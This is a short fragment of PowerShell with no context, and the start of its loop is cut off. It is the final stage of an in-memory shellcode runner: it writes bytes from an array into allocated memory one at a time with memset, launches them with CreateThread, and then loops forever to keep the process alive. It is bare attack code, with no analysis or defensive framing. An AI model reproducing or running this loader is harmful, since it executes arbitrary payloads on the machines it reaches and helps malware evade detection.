($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};